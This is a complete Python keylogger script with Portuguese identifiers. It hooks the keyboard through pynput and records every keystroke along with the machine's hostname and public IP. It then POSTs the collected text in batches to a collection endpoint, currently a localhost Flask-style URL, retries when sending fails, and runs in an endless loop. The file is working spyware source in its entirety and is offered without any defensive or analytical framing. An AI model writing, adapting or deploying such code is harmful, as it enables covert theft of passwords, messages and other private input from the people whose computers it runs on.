from pynput.keyboard import Key, Listener
import requests
from os import uname
from time import sleep


class Kilogger():
    def __init__(self):        
        self.criador = ''
        self.url = 'http://127.0.0.1:5000' + '/add'
        self.limite_caracteres = 1000
        
        self.ip_publico = ''
        self.nome_pc = ''
        self.teclas_digitadas = ''

        self.caps = False
        self.shift = False

    def get_ip_public(self):
        print('**Adquirindo IP público**')
        try:
            ip_publico = str(requests.get('https://api.ipify.org/').text)
            self.ip_publico = ip_publico
            return ip_publico
        except requests.exceptions.ConnectionError:
            print('**Sem Internet Para Buscar o IP**')

    def get_name_pc(self):
        print('**Adquirindo Nome Computador**')
        nome_pc = uname().nodename
        self.nome_pc = nome_pc
        return nome_pc

    def on_press(self, key):
        try:
            letra = str(key.char)

            if self.caps or self.shift:
                letra = letra.upper()
            
            self.teclas_digitadas += letra

            if len(self.teclas_digitadas) >= self.limite_caracteres:
                return False

        except AttributeError:
            if key == Key.backspace:
                self.teclas_digitadas = self.teclas_digitadas[:-1]

            if key == Key.space:
                self.teclas_digitadas += ' '

            if key == Key.caps_lock:
                self.caps = not self.caps
            
            if key == Key.shift:
                self.shift = True

    def on_release(self, key):
        self.shift

        if key == Key.shift:
            self.shift = False
    
    def monitorar_teclas(self):
        print('**Começando monitoramento do teclado**')
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def limpar_teclas(self):
        self.teclas_digitadas = ''

    def enviar_data(self):
        print('**Enviando dados**')
        data = {
            'pcname': self.nome_pc,
            'texto': self.teclas_digitadas,
            'criador': self.criador,
            'ip': self.ip_publico}
        
        for i in range(5):
            try:
                r = requests.post(url=self.url, json=data)
                print(r.json())
                return
            except requests.exceptions.ConnectionError:
                print('**Não foi possivel enviar as Keys**')
                sleep(0.5)
                print('***Tentando Novamente***')

        print('**Impossivel Fazer POST**')


keylogger = Kilogger()
keylogger.get_ip_public()
keylogger.get_name_pc()

while True:
    keylogger.monitorar_teclas()
    keylogger.enviar_data()
    keylogger.limpar_teclas()
    print('**Reiniciando Loop**')
